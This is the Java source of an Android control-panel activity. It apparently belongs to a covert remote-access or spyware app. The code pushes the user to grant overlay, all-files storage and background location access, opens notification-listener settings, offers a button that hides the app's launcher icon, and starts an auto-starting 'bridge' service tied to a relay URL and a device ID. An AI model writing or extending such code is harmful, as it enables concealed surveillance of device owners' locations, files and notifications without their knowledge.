package com.hashibridge.master;

import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import com.hashibridge.master.utils.PermissionHelper;

public class ControlPanelActivity extends AppCompatActivity {

    private static final int RC_PERMISSIONS = 1001;
    private static final int RC_BACKGROUND_LOCATION = 1002;
    private static final int RC_OVERLAY = 1003;
    private static final int RC_STORAGE = 1004;

    private EditText etRelayUrl;
    private EditText etDeviceId;
    private TextView tvStatus;
    private Button btnStart;
    private Button btnStop;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_control_panel);

        etRelayUrl = findViewById(R.id.et_relay_url);
        etDeviceId = findViewById(R.id.et_device_id);
        tvStatus = findViewById(R.id.tv_status);
        btnStart = findViewById(R.id.btn_start);
        btnStop = findViewById(R.id.btn_stop);
        Button btnCopyId = findViewById(R.id.btn_copy_id);

        String savedRelay = com.hashibridge.master.utils.Config.getRelayUrl(this);
        if (savedRelay.isEmpty()) {
            savedRelay = getString(R.string.default_relay_url);
        }
        String deviceId = com.hashibridge.master.utils.Config.getOrCreateDeviceId(this);

        etRelayUrl.setText(savedRelay);
        etDeviceId.setText(deviceId);

        if (btnCopyId != null) {
            btnCopyId.setOnClickListener(v -> copyDeviceId());
        }

        btnStart.setOnClickListener(v -> startBridgeService());
        btnStop.setOnClickListener(v -> stopBridgeService());
        findViewById(R.id.btn_permissions).setOnClickListener(v -> startPermissionFlow());
        findViewById(R.id.btn_notif_listener).setOnClickListener(v -> openNotificationListenerSettings());

        Button btnHideIcon = findViewById(R.id.btn_hide_icon);
        Button btnShowIcon = findViewById(R.id.btn_show_icon);
        if (btnHideIcon != null) {
            btnHideIcon.setOnClickListener(v -> {
                com.hashibridge.master.utils.Config.hideAppIcon(this);
                Toast.makeText(this, "Icon hidden", Toast.LENGTH_SHORT).show();
                updateStatus();
            });
        }
        if (btnShowIcon != null) {
            btnShowIcon.setOnClickListener(v -> {
                com.hashibridge.master.utils.Config.showAppIcon(this);
                Toast.makeText(this, "Icon shown", Toast.LENGTH_SHORT).show();
                updateStatus();
            });
        }

        updateStatus();
    }

    private void copyDeviceId() {
        String id = etDeviceId.getText().toString().trim();
        if (!id.isEmpty()) {
            ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
            ClipData clip = ClipData.newPlainText("Device ID", id);
            clipboard.setPrimaryClip(clip);
            Toast.makeText(this, "Device ID Copied: " + id, Toast.LENGTH_SHORT).show();
        }
    }

    private void startPermissionFlow() {
        if (!Settings.canDrawOverlays(this)) {
            Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:" + getPackageName()));
            startActivityForResult(i, RC_OVERLAY);
            return;
        }

        if (PermissionHelper.needsManageStorage()
                && !PermissionHelper.isExternalStorageManager(this)) {
            Intent manage = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION,
                    Uri.parse("package:" + getPackageName()));
            try {
                startActivityForResult(manage, RC_STORAGE);
            } catch (Exception e) {
                startActivityForResult(
                        new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION), RC_STORAGE);
            }
            return;
        }

        String[] perms = PermissionHelper.getRuntimePermissions();
        if (perms.length > 0) {
            ActivityCompat.requestPermissions(this, perms, RC_PERMISSIONS);
        } else {
            onRuntimePermissionsDone();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions,
                                           @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == RC_PERMISSIONS) {
            onRuntimePermissionsDone();
        }
    }

    private void onRuntimePermissionsDone() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            ActivityCompat.requestPermissions(this,
                    new String[]{android.Manifest.permission.ACCESS_BACKGROUND_LOCATION},
                    RC_BACKGROUND_LOCATION);
        }
        updateStatus();
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == RC_OVERLAY || requestCode == RC_STORAGE) {
            startPermissionFlow();
        }
    }

    private void startBridgeService() {
        String relayUrl = etRelayUrl.getText().toString().trim();
        String deviceId = etDeviceId.getText().toString().trim();

        if (relayUrl.isEmpty()) {
            relayUrl = getString(R.string.default_relay_url);
        }
        if (deviceId.isEmpty()) {
            deviceId = com.hashibridge.master.utils.Config.getOrCreateDeviceId(this);
        }

        com.hashibridge.master.utils.Config.saveConfig(this, relayUrl, deviceId);
        com.hashibridge.master.utils.Config.setAutoStart(this, true);

        Intent intent = new Intent(this, BridgeService.class);
        intent.putExtra("relayUrl", relayUrl);
        intent.putExtra("deviceId", deviceId);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent);
        } else {
            startService(intent);
        }

        Toast.makeText(this, "Bridge service started", Toast.LENGTH_SHORT).show();
        updateStatus();
    }

    private void stopBridgeService() {
        stopService(new Intent(this, BridgeService.class));
        com.hashibridge.master.utils.Config.setAutoStart(this, false);
        Toast.makeText(this, "Bridge service stopped", Toast.LENGTH_SHORT).show();
        updateStatus();
    }

    private void openNotificationListenerSettings() {
        startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
    }

    private void updateStatus() {
        boolean running = BridgeService.isRunning();
        tvStatus.setText(running ? "Service: RUNNING ✓" : "Service: STOPPED");
        tvStatus.setTextColor(running ? 0xFF22C55E : 0xFFEF4444);
        btnStart.setEnabled(!running);
        btnStop.setEnabled(running);

        etRelayUrl.setEnabled(!running);
        etDeviceId.setEnabled(!running);
    }

    @Override
    protected void onResume() {
        super.onResume();
        updateStatus();
    }
}
